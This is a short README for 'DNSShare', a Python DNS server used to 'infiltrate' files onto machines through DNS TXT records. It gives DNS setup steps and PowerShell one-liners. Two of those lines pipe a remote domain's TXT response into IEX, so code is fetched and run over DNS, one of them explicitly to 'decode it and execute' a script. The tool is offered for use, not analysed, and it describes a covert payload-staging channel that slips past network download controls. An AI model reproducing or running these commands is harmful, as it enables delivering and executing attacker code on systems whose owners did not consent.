# DNSShare

Share (infiltrate) files over DNS with ease.

# Getting started

## Setup DNS records

1. Create an `A` record for your `example.com` pointing at your server IP address.
2. Create an `A` record for an `ns1` subdomain (i.e. `ns1.example.com`) that points to your server IP address.
3. Create an NS record with an arbitrary subdomain, for example `t` (i.e. `t.example.com`) which is managed by `ns1.example.com`.

## Start DNS server

```bash
python3 dnsshare.py -a <interface> -d <t.example.com> -f <files directory>
```

# Transfer files

## List directory content of the DNS server

```powershell
(Resolve-DnsName ls.t.example.com -TYPE TXT).Strings
```

## Obtain file into `$o` variable (as bytes)

```powershell
IEX((Resolve-DnsName file.txt.f.example.com -TYPE TXT).Strings[1])
```

## Obtain file, decode it and execute (ps1 script)

```powershell
IEX((Resolve-DnsName file.txt.c.t.example.com -TYPE TXT).Strings[1])
```

## Get remote file hash

```powershell
(Resolve-DnsName file.txt.f.t.example.com -TYPE TXT).Strings[0]
```
